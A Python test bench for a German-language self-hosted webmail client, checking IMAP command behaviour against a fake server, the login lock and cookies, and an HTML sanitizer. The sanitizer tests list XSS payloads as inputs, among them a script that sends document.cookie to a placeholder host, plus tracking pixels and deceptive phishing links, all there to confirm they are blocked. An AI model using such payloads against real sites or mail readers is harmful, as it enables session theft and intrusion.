#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test bench for the mail client (5.0.0) — run it before every deploy.

    python3 probe_klient.py

🔑 It proves the two things that cannot be checked by looking at the source:

  1. WHAT GOES OVER THE WIRE. A fake IMAP server records every command. That is
     how „every fetch uses BODY.PEEK" and „`\\Deleted` only AFTER a confirmed
     copy" become measurable instead of claimed — including the counter-test: with
     a failing COPY there must be NO `\\Deleted` and NO `EXPUNGE`.

  2. WHAT THE DOOR HOLDS. A real page is started on a free port and asked without
     a cookie. Every client action has to refuse, and the attachment route too —
     links get forwarded, and a link that works without the word is the hole the
     whole lock was built to close.

Nothing here touches a real mailbox, and nothing sends a mail: the fake server is
addressed instead of the provider, and for sending a socket is opened that answers
like an SMTP server and throws everything away.
"""
from __future__ import annotations

import base64
import imaplib
import io
import json
import os
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request

# 🔴 Addresses from RFC 5737 (192.0.2.0/24, 203.0.113.0/24) — reserved for
# documentation. A made-up „10.x" is a PRIVATE network address, the leak probe
# rightly refuses to publish one, and a wall that fires on the test bench every
# time is a wall people learn to climb over.

HIER = os.path.dirname(os.path.abspath(__file__))
# 🔴 A HOME OF ITS OWN, set BEFORE the client is imported. The module reads
# `POSTWACHE_HOME` once at import time — set it afterwards and the test bench
# writes its access word into the real state. That is the sort of test that
# breaks the thing it was meant to protect.
TMP = tempfile.mkdtemp(prefix="postwache-probe-")
os.environ["POSTWACHE_HOME"] = TMP
os.makedirs(os.path.join(TMP, "state"), exist_ok=True)
os.makedirs(os.path.join(TMP, "out"), exist_ok=True)
sys.path.insert(0, HIER)

fehler = []
proben = 0


def probe(name, ok, zusatz=""):
    global proben
    proben += 1
    print("  %s %s%s" % ("OK  " if ok else "FEHL", name,
                         ("  — " + str(zusatz)) if zusatz else ""))
    if not ok:
        fehler.append(name)


# ══ A fake IMAP server ════════════════════════════════════════════════════
# Speaks just enough IMAP for the client, and writes down every line it is told.
# 🔴 Plain text, not TLS: a certificate would have to be generated, and
# `imaplib.IMAP4_SSL` is swapped for `imaplib.IMAP4` for the test anyway. What is
# being measured here is the COMMANDS, not the transport.
# 🔴 The owner is „inhaber", not a real first name. The publication filter watches
# for the owner's name — and a test file that trips it every time teaches everyone
# to ignore the finding. What nobody can publish, nobody has to filter.
KOPF_101 = (b"From: Anna Beispiel <anna@erfunden.example>\r\n"
            b"To: inhaber@erfunden.example\r\n"
            b"Subject: Kurze Frage zum Termin\r\n"
            b"Date: Sat, 27 Sep 2026 10:12:00 +0200\r\n"
            b"Message-Id: <eins@erfunden.example>\r\n\r\n")
# 🔴 An RFC 2047 subject and a Latin-1 body — both are the cases that break a
# client that decodes everything as UTF-8.
KOPF_102 = (b"From: =?iso-8859-1?Q?Gr=FC=DFe?= <shop@erfunden.example>\r\n"
            b"To: inhaber@erfunden.example, zweiter@erfunden.example\r\n"
            b"Cc: dritter@erfunden.example\r\n"
            b"Subject: =?UTF-8?B?UmVjaG51bmcgZsO8ciBTZXB0ZW1iZXI=?=\r\n"
            b"Date: Fri, 26 Sep 2026 18:45:10 +0200\r\n"
            b"Message-Id: <zwei@erfunden.example>\r\n"
            b"List-Unsubscribe: <https://erfunden.example/abmelden>\r\n\r\n")
# 🔴 RAW eight-bit — no „=?UTF-8?B?…?=" around it. Plenty of real mail arrives
# like this, and `email.message_from_bytes()` replaces the bytes with U+FFFD
# before anyone could decode them. Without this case in the bench the client shows
# „Gr\ufffd\ufffde" and every test stays green — which is exactly what happened
# until the SCREENSHOT was looked at.
KOPF_103 = ("From: Amt Sandström <amt@erfunden.example>\r\n"
            "To: inhaber@erfunden.example\r\n"
            "Subject: Bescheid über Gebühren\r\n"
            "Date: Thu, 25 Sep 2026 08:00:00 +0200\r\n"
            "References: <eins@erfunden.example>\r\n"
            "Message-Id: <drei@erfunden.example>\r\n\r\n").encode("utf-8")
TEXT_101 = b"Hallo der Besitzer,\r\npasst dir Donnerstag?\r\n"
# 🔴 windows-1252, not UTF-8 and not pure Latin-1: the euro sign does not exist in
# Latin-1, and this is exactly the charset German invoice mail really arrives in.
TEXT_102_LATIN = "Sehr geehrter Kunde,\nIhre Rechnung über 49,90 € liegt bei.\n".encode("cp1252")
HTML_102 = (b"<html><head><style>.k{color:#333}</style></head><body>"
            b"<p class=\"k\">Ihre Rechnung</p>"
            b"<img src=\"https://tracker.erfunden.example/p.gif\">"
            b"<img src=\"cid:logo1\">"
            b"<script>alert(1)</script>"
            b"<a href=\"http://konto-pruefen.erfunden.example\">www.bank.example</a>"
            b"</body></html>")
STRUKTUR = {
    101: b'("TEXT" "PLAIN" ("CHARSET" "utf-8") NIL NIL "7BIT" 42 2 NIL NIL NIL NIL)',
    102: (b'(("TEXT" "PLAIN" ("CHARSET" "windows-1252") NIL NIL "8BIT" 70 2 NIL NIL NIL NIL)'
          b'("TEXT" "HTML" ("CHARSET" "utf-8") NIL NIL "7BIT" 320 4 NIL NIL NIL NIL)'
          b'("IMAGE" "PNG" ("NAME" "logo.png") "<logo1>" NIL "BASE64" 120 NIL'
          b' ("INLINE" ("FILENAME" "logo.png")) NIL NIL)'
          b'("APPLICATION" "PDF" ("NAME" "Rechnung.pdf") NIL NIL "BASE64" 51200 NIL'
          b' ("ATTACHMENT" ("FILENAME" "Rechnung September.pdf")) NIL NIL)'
          b' "MIXED" ("BOUNDARY" "xx") NIL NIL NIL)'),
    103: b'("TEXT" "PLAIN" ("CHARSET" "us-ascii") NIL NIL "7BIT" 20 1 NIL NIL NIL NIL)',
}
KOEPFE = {101: KOPF_101, 102: KOPF_102, 103: KOPF_103}
FLAGGEN = {101: r"", 102: r"\Flagged \Seen", 103: r"\Seen \Answered"}
TEILE = {(102, "1"): TEXT_102_LATIN, (102, "2"): HTML_102,
         (102, "3"): base64.b64encode(b"\x89PNG-erfunden"),
         (102, "4"): base64.b64encode(b"%PDF-erfunden"),
         (101, "1"): TEXT_101, (101, "TEXT"): TEXT_101}
ORDNER = [
    (r"\HasNoChildren", "INBOX"),
    (r"\HasNoChildren \Sent", "INBOX.Gesendet"),
    (r"\HasNoChildren \Trash", "INBOX.Papierkorb"),
    (r"\HasNoChildren \Drafts", "INBOX.Entwuerfe"),
    (r"\HasNoChildren", "INBOX.Gel&APY-schtes"),
    (r"\HasNoChildren \Junk", "INBOX.Werbung"),
    (r"\HasChildren \Noselect", "INBOX.Technik"),
    (r"\HasNoChildren", "INBOX.Technik.Synology"),
]


class FalscherIMAP(threading.Thread):
    """One client at a time, one command at a time. `self.befehle` is the record."""

    def __init__(self, faehig=(), kopie_geht=True):
        super().__init__(daemon=True)
        self.dose = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.dose.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.dose.bind(("127.0.0.1", 0))
        self.dose.listen(4)
        self.port = self.dose.getsockname()[1]
        self.faehig = list(faehig)
        self.kopie_geht = kopie_geht
        self.befehle = []
        self.angehaengt = []
        self.gewaehlt = "INBOX"
        self.laeuft = True
        # What STATUS answers — a probe moves these to play „mail has arrived".
        self.zahlen = {"MESSAGES": 3, "UNSEEN": 1, "UIDNEXT": 104}
        self.ordner = list(ORDNER)          # this server's own tree, it can change
        self.umbenannt = []
        # 🔴 A folder created a moment ago is EMPTY. A fake server that answers
        # „3 mails" for every folder in the world cannot tell the probe whether
        # the question before deleting is asked for the right reason.
        self.frisch = set()
        self.idle_an = threading.Event()     # set while a connection is idling
        self.idle_datei = None
        self.schreibt = threading.Lock()

    def run(self):
        while self.laeuft:
            try:
                verbindung, _ = self.dose.accept()
            except OSError:
                return
            threading.Thread(target=self._bedienen, args=(verbindung,),
                             daemon=True).start()

    def _bedienen(self, v):
        datei = v.makefile("rwb")
        cap = " ".join(["IMAP4rev1"] + self.faehig)
        datei.write(("* OK [CAPABILITY %s] erfunden\r\n" % cap).encode())
        datei.flush()
        while True:
            zeile = datei.readline()
            if not zeile:
                return
            self.befehle.append(zeile.decode("utf-8", "replace").strip())
            try:
                if not self._antworten(datei, zeile):
                    return
            except Exception as e:                       # noqa: BLE001
                print("    (falscher Server: %s)" % e)
                return

    def _antworten(self, datei, zeile):
        roh = zeile.decode("utf-8", "replace").strip()
        marke, _, rest = roh.partition(" ")
        wort = rest.split(" ")[0].upper() if rest else ""
        args = rest[len(wort):].strip()

        # 🔴 A tagged answer NEEDS text after the status. `imaplib` parses
        # „<tag> <TYPE> <data>" with a required space — a bare „A1 OK" makes it
        # throw „unexpected response" and the whole connection dies. Cost an hour.
        def raus(*zeilen):
            with self.schreibt:
                for z in zeilen:
                    datei.write(z if isinstance(z, bytes) else z.encode())
                datei.flush()

        if wort == "CAPABILITY":
            raus("* CAPABILITY %s\r\n" % " ".join(["IMAP4rev1"] + self.faehig),
                 "%s OK fertig\r\n" % marke)
        elif wort == "LOGIN":
            raus("%s OK angemeldet\r\n" % marke)
        elif wort == "LIST":
            for flaggen, name in self.ordner:
                raus('* LIST (%s) "." "%s"\r\n' % (flaggen, name))
            raus("%s OK fertig\r\n" % marke)
        elif wort in ("SELECT", "EXAMINE"):
            self.gewaehlt = (re.findall(r'"([^"]*)"', args) or ["INBOX"])[0]
            raus("* 3 EXISTS\r\n", "* OK [UIDVALIDITY 7]\r\n",
                 "* OK [UIDNEXT 104]\r\n",
                 "%s OK [READ-%s] gewaehlt\r\n"
                 % (marke, "ONLY" if wort == "EXAMINE" else "WRITE"))
        elif wort == "STATUS":
            name = (re.findall(r'"([^"]*)"', args) or ["INBOX"])[0]
            leer = name in self.frisch
            raus('* STATUS "%s" (MESSAGES %d UNSEEN %d UIDNEXT %d)\r\n'
                 % (name, 0 if leer else self.zahlen["MESSAGES"],
                    0 if leer else self.zahlen["UNSEEN"], self.zahlen["UIDNEXT"]),
                 "%s OK fertig\r\n" % marke)
        elif wort == "NOOP":
            raus("%s OK fertig\r\n" % marke)
        elif wort == "IDLE":
            # 🔑 The fake server has to behave like the real one HERE of all
            # places: answer „+ idling", then say nothing at all until either
            # something happens or the client sends DONE. Only then can the test
            # bench measure whether the page really hears instead of asking.
            self.idle_datei = datei
            raus("+ idling\r\n")
            self.idle_an.set()
            try:
                while True:
                    z = datei.readline()
                    if not z:
                        return False
                    self.befehle.append(z.decode("utf-8", "replace").strip())
                    if z.strip().upper() == b"DONE":
                        break
            finally:
                self.idle_an.clear()
                self.idle_datei = None
            raus("%s OK fertig\r\n" % marke)
        elif wort in ("SUBSCRIBE", "UNSUBSCRIBE"):
            raus("%s OK fertig\r\n" % marke)
        elif wort == "CREATE":
            # 🔴 A fake server that says OK and forgets proves nothing: the very
            # point of creating a folder is that the next LIST has it in it.
            name = (re.findall(r'"([^"]*)"', args) or [""])[0]
            if name and name not in [n for _, n in self.ordner]:
                self.ordner.append((r"\HasNoChildren", name))
                self.frisch.add(name)
            raus("%s OK fertig\r\n" % marke)
        elif wort == "DELETE":
            name = (re.findall(r'"([^"]*)"', args) or [""])[0]
            self.ordner = [(f, n) for f, n in self.ordner if n != name]
            raus("%s OK fertig\r\n" % marke)
        elif wort == "RENAME":
            # 🔑 The real server moves the folder, its mail and its subfolders in
            # this ONE command. The fake one does the same to its list of folders
            # — otherwise the bench would prove a move that never happened.
            namen = re.findall(r'"([^"]*)"', args)
            if len(namen) == 2:
                alt_n, neu_n = namen
                self.umbenannt.append((alt_n, neu_n))
                for i, (fl, nm) in enumerate(self.ordner):
                    if nm == alt_n:
                        self.ordner[i] = (fl, neu_n)
                    elif nm.startswith(alt_n + "."):
                        self.ordner[i] = (fl, neu_n + nm[len(alt_n):])
            raus("%s OK fertig\r\n" % marke)
        elif wort == "EXPUNGE":
            raus("%s OK fertig\r\n" % marke)
        elif wort == "APPEND":
            groesse = int((re.findall(r"\{(\d+)\}", args) or ["0"])[0])
            raus("+ weiter\r\n")
            koerper = datei.read(groesse)
            datei.readline()
            self.angehaengt.append(koerper)
            raus("%s OK angehaengt\r\n" % marke)
        elif wort == "LOGOUT":
            raus("* BYE\r\n", "%s OK fertig\r\n" % marke)
            return False
        elif wort == "UID":
            self._uid(marke, args, raus)
        else:
            raus("%s BAD unbekannt\r\n" % marke)
        return True

    def _uid(self, marke, args, raus):
        unter = args.split(" ")[0].upper()
        rest = args[len(unter):].strip()
        if unter == "SEARCH":
            raus("* SEARCH %s\r\n" % self._treffer(rest),
                 "%s OK fertig\r\n" % marke)
        elif unter == "SORT":
            if "SORT" not in self.faehig:
                raus("%s BAD kein SORT\r\n" % marke)
                return
            # A SORT also has to honour the criteria — otherwise the test bench
            # proves the filter works while the fake server was simply ignoring it.
            treffer = self._treffer(rest)
            raus("* SORT %s\r\n" % " ".join(reversed(treffer.split())),
                 "%s OK fertig\r\n" % marke)
        elif unter == "FETCH":
            self._fetch(marke, rest, raus)
        elif unter == "STORE":
            raus("%s OK gespeichert\r\n" % marke)
        elif unter == "COPY":
            raus("%s %s\r\n" % (marke, "OK kopiert" if self.kopie_geht
                                else "NO Ordner voll"))
        elif unter == "MOVE":
            if "MOVE" not in self.faehig:
                raus("%s BAD kein MOVE\r\n" % marke)
                return
            raus("%s OK bewegt\r\n" % marke)
        else:
            raus("%s BAD unbekannt\r\n" % marke)

    def _treffer(self, rest):
        oben = rest.upper()
        # One folder with 25 mails — paging cannot be measured on three.
        if self.gewaehlt.endswith("Synology"):
            return " ".join(str(u) for u in range(101, 126))
        if "UNSEEN" in oben:
            return "101"
        if "FLAGGED" in oben:
            return "102"
        if "UNANSWERED" in oben:
            return "101 102"
        return "101 102 103"

    def _fetch(self, marke, rest, raus):
        satz, _, was = rest.partition(" ")
        uids = [int(x) for x in satz.split(",") if x.isdigit()]
        wasu = was.upper()
        # 🔴 WHICH part is asked for decides — not whether the string contains
        # „BODY.PEEK[". The header block is requested as `[HEADER]` and as
        # `[HEADER.FIELDS (…)]`; reading that as part number „HEADER" is how the
        # fake server answered every single mail with nothing and made six real
        # probes fail without a real fault behind them.
        teil = re.search(r"BODY\.PEEK\[([^\]]*)\](?:<(\d+)\.(\d+)>)?", was, re.I)
        nummer = teil.group(1) if teil else None
        # A real server hands back exactly the piece that was asked for — and
        # says from which octet. The excerpt in the list lives on that, so the
        # fake server has to cut as well, or the probe would test nothing.
        von = int(teil.group(2)) if teil and teil.group(2) else None
        wieviel = int(teil.group(3)) if teil and teil.group(3) else None
        for nr, uid in enumerate(uids, 1):
            if "BODYSTRUCTURE" in wasu:
                raus("* %d FETCH (UID %d BODYSTRUCTURE %s)\r\n"
                     % (nr, uid, STRUKTUR.get(uid, STRUKTUR[101]).decode()))
            elif nummer is not None and nummer.upper().startswith("HEADER"):
                kopf = KOEPFE.get(uid, KOPF_101)
                raus("* %d FETCH (UID %d FLAGS (%s) INTERNALDATE \"27-Sep-2026 10:12:00 +0200\""
                     " RFC822.SIZE %d BODY[HEADER] {%d}\r\n"
                     % (nr, uid, FLAGGEN.get(uid, ""), len(kopf) + 300, len(kopf)),
                     kopf, ")\r\n")
            elif nummer is not None:
                roh = TEILE.get((uid, nummer), b"")
                if not roh and nummer == "":
                    roh = KOEPFE.get(uid, b"") + TEXT_101
                if von is not None:
                    roh = roh[von:von + (wieviel or len(roh))]
                    raus("* %d FETCH (UID %d BODY[%s]<%d> {%d}\r\n"
                         % (nr, uid, nummer, von, len(roh)), roh, ")\r\n")
                else:
                    raus("* %d FETCH (UID %d BODY[%s] {%d}\r\n"
                         % (nr, uid, nummer, len(roh)), roh, ")\r\n")
        raus("%s OK fertig\r\n" % marke)

    def klopfen(self, zeile="* 4 EXISTS"):
        """Say something unasked — exactly what a server does when mail arrives."""
        datei = self.idle_datei
        if datei is None:
            return False
        with self.schreibt:
            datei.write((zeile + "\r\n").encode())
            datei.flush()
        return True

    def halt(self):
        self.laeuft = False
        try:
            self.dose.close()
        except OSError:
            pass


def mit_falschem_server(faehig=(), kopie_geht=True):
    """Start the fake server and hand back a Briefkasten already connected to it."""
    server = FalscherIMAP(faehig, kopie_geht)
    server.start()
    imaplib.IMAP4_SSL = imaplib.IMAP4          # the transport is not what is tested
    import klient as K
    kasten = K.Briefkasten({"id": "probe", "adresse": "inhaber@erfunden.example",
                            "passwort": "geheim", "server": "127.0.0.1",
                            "port": server.port})
    kasten.__enter__()
    return server, kasten


# ══ 1. The lock ═══════════════════════════════════════════════════════════
print("\n── 1. Das Schloss ──")
import klient as K                                   # noqa: E402

probe("ohne Wort gilt das Postfach als verschlossen", not K.wort_gesetzt())
erst = K.wort_pruefen("irgendwas", "192.0.2.9")
probe("ohne gesetztes Wort laesst nichts durch",
      not erst["ok"] and erst.get("kein_wort") is True)
probe("ein zu kurzes Wort wird abgelehnt",
      not K.wort_setzen("kurz1")["ok"])
probe("ein langes Wort wird angenommen",
      K.wort_setzen("GutesLangesWort1")["ok"])
probe("das Wort liegt nur als Hash in der Datei",
      "GutesLangesWort1" not in io.open(
          os.path.join(TMP, "state", K.KLIENT_STAND), encoding="utf-8").read())
probe("die Zustandsdatei ist 0600",
      oct(os.stat(os.path.join(TMP, "state", K.KLIENT_STAND)).st_mode & 0o777) == "0o600")
probe("ein falsches Wort kommt nicht durch",
      not K.wort_pruefen("FalschesWort1", "192.0.2.9")["ok"])
probe("das richtige Wort kommt durch",
      K.wort_pruefen("GutesLangesWort1", "192.0.2.9")["ok"])
marke = K.sitzung_neu("192.0.2.9")
probe("die Sitzung gilt", K.sitzung_gueltig(marke))
probe("eine erfundene Sitzung gilt nicht", not K.sitzung_gueltig("erfunden-xyz"))
probe("eine leere Sitzung gilt nicht", not K.sitzung_gueltig(""))
K.sitzung_beenden(marke)
probe("nach dem Abmelden gilt sie nicht mehr", not K.sitzung_gueltig(marke))
probe("das Wort aendern verlangt das bisherige",
      not K.wort_setzen("NochEinWort22", "")["ok"])
probe("mit dem bisherigen geht es",
      K.wort_setzen("NochEinWort22", "GutesLangesWort1")["ok"])
alte = K.sitzung_neu("192.0.2.9")
K.wort_setzen("DrittesWort333", "NochEinWort22")
probe("ein neues Wort beendet jede alte Sitzung", not K.sitzung_gueltig(alte))
# 🔴 The brake. Without it, an eight-character word is a matter of an afternoon.
for _ in range(6):
    K.wort_pruefen("immerFalsch9", "192.0.2.77")
gebremst = K.wort_pruefen("DrittesWort333", "192.0.2.77")
probe("nach mehreren Fehlversuchen bremst es",
      not gebremst["ok"] and gebremst.get("warte", 0) > 0, "%s s" % gebremst.get("warte"))
probe("eine andere Adresse ist davon nicht betroffen",
      K.wort_pruefen("DrittesWort333", "192.0.2.88")["ok"])
keks = K.keks_setzen(K.sitzung_neu("192.0.2.9"), False)
probe("der Keks ist HttpOnly und SameSite=Strict",
      "HttpOnly" in keks and "SameSite=Strict" in keks)
probe("ohne TLS kein Secure-Merker", "Secure" not in keks)
probe("mit TLS ein Secure-Merker",
      "Secure" in K.keks_setzen("x", True))
probe("der Keks wird aus vielen gelesen",
      K.keks_lesen("andere=1; %s=abc123; nochwas=2" % K.KEKS) == "abc123")
schloss = K.lage_schloss("")
probe("die Lage vor dem Anmelden nennt nur das Schloss",
      set(schloss) == {"wort", "an", "sperre_seite"} and schloss["an"] is False)


# ══ 2. The door in the page ═══════════════════════════════════════════════
print("\n── 2. Das Tor in der Seite ──")
import post_web as PW                                # noqa: E402

frei = socket.socket()
frei.bind(("127.0.0.1", 0))
WEB_PORT = frei.getsockname()[1]
frei.close()
umgebung = dict(os.environ, POSTWACHE_HOME=TMP, POSTWACHE_WEB_PORT=str(WEB_PORT))
umgebung.pop("POSTWACHE_TAKT", None)
seite = subprocess.Popen([sys.executable, os.path.join(HIER, "post_web.py")],
                         env=umgebung, stdout=subprocess.DEVNULL,
                         stderr=subprocess.STDOUT)
WURZEL = "http://127.0.0.1:%d" % WEB_PORT


def hol(weg, daten=None, keks="", kopf=None, rohkeks=""):
    anfrage = urllib.request.Request(
        WURZEL + weg,
        data=json.dumps(daten).encode() if daten is not None else None,
        headers={"Content-Type": "application/json"})
    for name, wert in (kopf or {}).items():
        anfrage.add_header(name, wert)
    if keks:
        anfrage.add_header("Cookie", "%s=%s" % (K.KEKS, keks))
    elif rohkeks:
        anfrage.add_header("Cookie", rohkeks)
    try:
        with urllib.request.urlopen(anfrage, timeout=8) as a:
            roh = a.read()
            try:
                return a.status, json.loads(roh.decode("utf-8")), a.headers
            except ValueError:
                return a.status, roh.decode("utf-8", "replace"), a.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


for _ in range(60):
    try:
        with urllib.request.urlopen(WURZEL + "/api/lage", timeout=1):
            break
    except Exception:
        time.sleep(0.15)

code, antwort, _ = hol("/post")
probe("/post liefert die Klientenseite",
      code == 200 and isinstance(antwort, str) and "post_klient" not in antwort
      and 'id="tor"' in antwort)
probe("die Seite kommt zu mit dem Tor ZU",
      isinstance(antwort, str) and 'class="tor auf"' in antwort
      and 'id="app" hidden' in antwort)
# 🔴 The frame must not be allowed to run scripts. With `allow-scripts` AND
# `allow-same-origin` the mail would have full access to the page.
rahmen_attr = re.search(r'sandbox="([^"]*)"', antwort or "")
probe("der Brief-Rahmen ist eingesperrt", bool(rahmen_attr))
probe("der Rahmen darf keine Skripte ausfuehren",
      bool(rahmen_attr) and "allow-scripts" not in rahmen_attr.group(1),
      rahmen_attr.group(1) if rahmen_attr else "")

# ── Which of the two pages ────────────────────────────────────────────────
TELEFON_KOPF = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X)"
                              " AppleWebKit/605.1 (KHTML, like Gecko) Version/18.0"
                              " Mobile/15E148 Mobile Safari/604.1"}
TABLET_KOPF = {"User-Agent": "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X)"
                             " AppleWebKit/605.1 Mobile/15E148 Safari/604.1"}
RECHNER_KOPF = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
                              " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141"}
_, telefon_seite, _ = hol("/post", kopf=TELEFON_KOPF)
_, rechner_seite, _ = hol("/post", kopf=RECHNER_KOPF)
_, tablet_seite, _ = hol("/post", kopf=TABLET_KOPF)
probe("ein Telefon bekommt die Handy-Fassung",
      'id="b_liste"' in telefon_seite and "apple-mobile-web-app-capable" in telefon_seite)
probe("ein Rechner bekommt die breite Fassung",
      'id="raum"' in rechner_seite and 'id="b_liste"' not in rechner_seite)
probe("ein Tablet bekommt die breite Fassung — es hat den Platz",
      'id="raum"' in tablet_seite)
# 🔴 The choice by hand has to STICK. Without the cookie the link „wide view"
# works exactly once and the next reload drops the reader back on the phone page.
code, breit, kopf = hol("/post?ansicht=breit", kopf=TELEFON_KOPF)
setz = (kopf or {}).get("Set-Cookie") or ""
probe("das Telefon darf die breite Fassung wählen", 'id="raum"' in breit)
probe("diese Wahl wird gemerkt", "pw_ansicht=breit" in setz, setz[:40])
_, danach, _ = hol("/post", kopf=TELEFON_KOPF, rohkeks="pw_ansicht=breit")
probe("und beim naechsten Mal gilt sie noch", 'id="raum"' in danach)
_, zurueck, _ = hol("/post?ansicht=mobil", kopf=RECHNER_KOPF)
probe("und der Rechner darf die Handy-Fassung sehen", 'id="b_liste"' in zurueck)
probe("die Handy-Fassung kommt ebenfalls mit dem Tor ZU",
      'class="tor auf"' in telefon_seite)
m_rahmen = re.search(r'sandbox="([^"]*)"', telefon_seite)
probe("auch dort ist der Brief-Rahmen ohne Skripte",
      bool(m_rahmen) and "allow-scripts" not in m_rahmen.group(1))
probe("beide Fassungen bringen ihre Texttabelle mit",
      "const T = {" in telefon_seite and "const T = {" in rechner_seite)
# Every finger target of the phone page is at least 44 px — measured on the
# declaration, not on the hope.
probe("die Handy-Fassung erklaert Fingerziele von mindestens 2,75rem",
      "min-height:2.75rem" in telefon_seite)
probe("die Handy-Fassung achtet auf den unteren Rand des Geraets",
      "safe-area-inset-bottom" in telefon_seite)

offen, dicht = [], []
for name in PW.KLIENT_AKTIONEN:
    code, antwort, _ = hol("/api/" + name, {})
    zu = isinstance(antwort, dict) and antwort.get("gesperrt") is True
    (dicht if zu else offen).append(name)
soll_offen = set(PW.KLIENT_OFFEN)
probe("jede Klient-Aktion ausser den Tor-Aktionen ist verschlossen",
      set(offen) <= soll_offen, "offen: %s" % ", ".join(sorted(offen)))
probe("es sind ueberhaupt Aktionen verschlossen", len(dicht) >= 10,
      "%d von %d" % (len(dicht), len(PW.KLIENT_AKTIONEN)))
for weg in ("/api/klient/anhang?uid=1&t=1", "/api/klient/bild?uid=1&cid=x",
            "/api/klient/roh?uid=1"):
    code, _, _ = hol(weg)
    probe("ohne Anmeldung: 401 auf %s" % weg.split("?")[0], code == 401, "HTTP %s" % code)

code, antwort, _ = hol("/api/klient_lage", {})
probe("die Lage ohne Sitzung nennt kein Postfach",
      isinstance(antwort, dict) and antwort.get("postfaecher") == []
      and "ordner" not in antwort)
code, antwort, kopf = hol("/api/klient_anmelden", {"wort": "falschfalsch"})
probe("ein falsches Wort bekommt keinen Keks",
      not (kopf or {}).get("Set-Cookie") and antwort.get("ok") is False)
code, antwort, kopf = hol("/api/klient_anmelden", {"wort": "DrittesWort333"})
setz = (kopf or {}).get("Set-Cookie") or ""
probe("das richtige Wort bekommt einen Keks", antwort.get("ok") is True and bool(setz))
SITZUNG = K.keks_lesen(setz.split(";")[0])
code, antwort, _ = hol("/api/klient_liste", {"ordner": "INBOX"}, keks=SITZUNG)
probe("mit Keks kommt die Aktion durch (auch wenn kein Postfach da ist)",
      isinstance(antwort, dict) and antwort.get("gesperrt") is not True)

# The page lock — and with it the question whether `/api/lage` is locked as well.
K.einstellung_setzen({"sperre_seite": True})
code, antwort, _ = hol("/api/lage")
probe("mit Seitensperre ist /api/lage verschlossen", code == 401, "HTTP %s" % code)
anfrage = urllib.request.Request(WURZEL + "/")
try:
    with urllib.request.urlopen(anfrage, timeout=5) as a:
        umgeleitet = a.url.endswith("/post?zurueck=/")
except urllib.error.HTTPError:
    umgeleitet = False
probe("mit Seitensperre fuehrt / zum Tor", umgeleitet)
code, antwort, _ = hol("/api/lage", keks=SITZUNG)
probe("mit Keks ist /api/lage wieder offen", code == 200, "HTTP %s" % code)
K.einstellung_setzen({"sperre_seite": False})
code, antwort, _ = hol("/api/lage")
probe("ohne Seitensperre ist /api/lage offen wie bisher", code == 200, "HTTP %s" % code)

# The start page setting must not swallow the watchman page.
K.einstellung_setzen({"startseite": "postfach"})
try:
    with urllib.request.urlopen(urllib.request.Request(WURZEL + "/"), timeout=5) as a:
        zum_postfach = a.url.endswith("/post")
    with urllib.request.urlopen(urllib.request.Request(WURZEL + "/?wache=1"), timeout=5) as a:
        wache_erreichbar = "ansicht_uebersicht" in a.read().decode("utf-8", "replace")
except Exception as e:
    zum_postfach, wache_erreichbar = False, False
probe("Startseite „Postfach“ leitet / zum Klienten", zum_postfach)
probe("der Waechter bleibt ueber /?wache=1 erreichbar", wache_erreichbar)
K.einstellung_setzen({"startseite": "waechter"})


# ══ 3. The cleaner: three walls ═══════════════════════════════════════════
print("\n── 3. Der Saeuberer ──")
ANGRIFFE = [
    ("Skript", '<script>fetch("http://boese.example?k="+document.cookie)</script>x',
     ("script", "boese.example")),
    ("onerror am Bild", '<img src=x onerror="alert(1)">', ("onerror",)),
    ("javascript: im Verweis", '<a href="javascript:alert(1)">klick</a>', ("javascript:",)),
    ("eingebetteter Rahmen", '<iframe src="http://boese.example"></iframe>', ("<iframe",)),
    ("Formular", '<form action="http://boese.example"><input name=pw></form>',
     ("<form", "<input")),
    ("SVG mit Skript", "<svg><script>alert(1)</script></svg>", ("script", "<svg")),
    ("onload am Koerper", "<body onload=alert(1)><p>x</p>", ("onload",)),
    ("Weiterleitung per meta", '<meta http-equiv="refresh" content="0;url=http://x">',
     ("http-equiv", "refresh")),
    ("@import im Stilblock", "<style>@import url(https://boese.example/a.css);</style>t",
     ("@import", "boese.example")),
    ("behavior im Stilblock", "<style>a{behavior:url(x.htc)}</style>t", ("behavior",)),
    ("Zaehlpixel", '<img src="https://tracker.example/p.gif?id=1">', ("tracker.example",)),
    ("Hintergrundbild von aussen",
     '<div style="background:url(https://tracker.example/b.png)">t</div>',
     ("tracker.example",)),
]
for name, roh, verboten in ANGRIFFE:
    sauber, blockiert, _ = K.html_saeubern(roh, False, [], "INBOX", 1)
    durch = [w for w in verboten if w.lower() in sauber.lower()]
    probe("geblockt: %s" % name, not durch, ", ".join(durch))
sauber, blockiert, _ = K.html_saeubern(
    '<img src="https://tracker.example/p.gif"><div style="background:url(http://x/y)">t</div>',
    False, [], "INBOX", 1)
probe("die geblockten Fernbezuege werden gezaehlt", blockiert == 2, str(blockiert))
sauber, _, _ = K.html_saeubern('<img src="https://echt.example/bild.png">', True,
                               [], "INBOX", 1)
probe("mit Erlaubnis kommt das Bild durch", "echt.example" in sauber)
sauber, _, _ = K.html_saeubern('<img src="cid:logo1">', False,
                               [{"id": "logo1", "nr": "3", "k": "BASE64"}], "INBOX", 9)
probe("ein eingebettetes Bild zeigt auf unseren eigenen Weg",
      "/api/klient/bild?" in sauber and "uid=9" in sauber)
sauber, _, _ = K.html_saeubern('<style>.k{color:red}</style><p class="k">x</p>',
                               False, [], "INBOX", 1)
probe("ein harmloser Stilblock bleibt erhalten", ".k{color:red}" in sauber)
_, _, links = K.html_saeubern(
    '<a href="http://konto-pruefen.example">www.bank.example</a>'
    '<a href="https://xn--bnk-qla.example">Konto</a>'
    '<a href="http://203.0.113.5/x">Rechnung</a>'
    '<a href="https://github.com/der Dienstbenutzer">github.com</a>', False, [], "INBOX", 1)
arten = {l["warnung"] for l in links}
probe("Text nennt eine andere Domain — erkannt", "text" in arten)
probe("Sonderzeichen-Domain — erkannt", "punycode" in arten)
